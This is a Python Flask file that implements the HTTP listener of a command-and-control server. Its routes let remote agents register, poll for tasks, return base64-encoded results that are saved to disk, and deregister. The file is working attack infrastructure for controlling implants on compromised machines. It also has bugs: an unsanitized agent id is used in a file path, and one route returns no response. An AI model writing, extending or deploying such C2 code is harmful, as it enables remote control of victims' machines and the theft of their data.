import flask 
from flask import Flask, request
import db 
from base64 import b64encode, b64decode
from threading import Thread
 
 
def startListener(ListenerId, port):
    
    app = Flask(__name__)

    app.config['MONGODB_SETTINGS'] = {
                 'db': 'C2',
                 'host': 'localhost',
                 'port': 27017  }
                                
    #Start HTTP listener 
    thread = Thread(target=app.run,kwargs= {'port': port, 'host': '0.0.0.0' })
    thread.daemon = True
    thread.start()
    #app.run(port = port,threaded=True) 

    #Define routes
    @app.route('/reg/<id>', methods= ['POST']) 
    def register(id):
        #Extract Agent ID, registered agents will be handled by their ID 
        agentID = id
        #timeout = request.args.post['timeout']  
        agentIP = request.remote_addr  
        db.registerAgent(agentID, agentIP)
        #Return a value of 1 to inform agent for successfull registration  
        return 'Success' 

    #The beaconing handler, agents will always pass their id when contacting the listener 
    @app.route('/task/<id>', methods= ['GET'])
    def task(id): 
        task = db.checkTask(id)
        #Agent should extract the task from http response
        return task

    @app.route('/task/results/<id>', methods= ['POST']) 
    def results(id): 
            if (request.form.get('results')): 
                with open('results/%s' % id, 'a+') as r: 
                    #Add timestamp
                    r.write(b64decode(request.form.get('results')).decode() + '\n')
                db.clearTask(id)     
                return "results received"    
            else: 
                return "No results provided"    

    @app.route('/fin/<id>', methods= ['GET']) 
    def fin(id): 
        #if agent requested termination 
        db.deleteAgent(id)

    @app.route('/') 
    #Testing putposes route
    def test(): 
        return "FLASK ALIVE!"